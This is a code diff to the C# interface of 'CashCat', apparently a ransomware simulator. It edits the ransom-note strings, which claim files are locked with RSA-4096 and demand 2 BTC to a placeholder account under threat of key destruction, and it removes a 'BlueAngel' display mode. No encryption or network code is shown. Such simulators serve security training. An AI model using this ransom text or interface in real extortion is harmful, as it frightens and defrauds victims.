@@ -36,7 +36,7 @@ namespace CashCat
 
         private bool encryptionInProgress = false;
         private string inProgressMessage = "Your important files are being encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Your files are being locked using a unique public RSA-4096 generated for this computer. Once the encryption operations are completed you will be unable to access your files without obtaining an unlock code from our internet dark web cyber server." + System.Environment.NewLine + System.Environment.NewLine + "Be prepared to pay the Ransom!";
-        private string completedMessage = "Your important files are now encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Your files are now encrypted with a RSA4096 generated for this computer. To decrypt files you need to obtain the private key by sending 2 BTC at SuperDuperSecretBitCoinAccount. The server will destroy the key after a time specified in this window." + System.Environment.NewLine + System.Environment.NewLine + "To obtain the private key for this computer, you need dot pay 2 BTC.";
+        private string completedMessage = "Your important files are now encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Your files are now encrypted with a RSA4096 generated for this computer. To decrypt files you need to obtain the private key by sending 2 BTC at SuperDuperSecretBitCoinAccount. The server will destroy the key after a time specified in this window." + System.Environment.NewLine;
         private string inProgressDecryptingMessage = "Your important files are being decrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Congratulations! Your files are being unlocked using the unique public RSA-4096 generated for this computer.";
         private string decryptedMessage = "Your important files are now decrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Thank You for being a great customer.";
 
@@ -88,17 +88,6 @@ namespace CashCat
                     }
 
 
-
-                }
-
-                if (CurrentConfig.catMode)
-                {
-                    // Enable Cat Mode
-                    fileOperations.WriteLog("ENABLING ANGEL MODE!");
-                    lblMainLabel.Content = "BlueAngel has encrypted your files!";
-                    LockerIcon.Visibility = Visibility.Collapsed;
-                    maingrid.Background = new SolidColorBrush(Colors.Transparent);
-                    CashCatBackground.Visibility = Visibility.Visible;
 
                 }
 
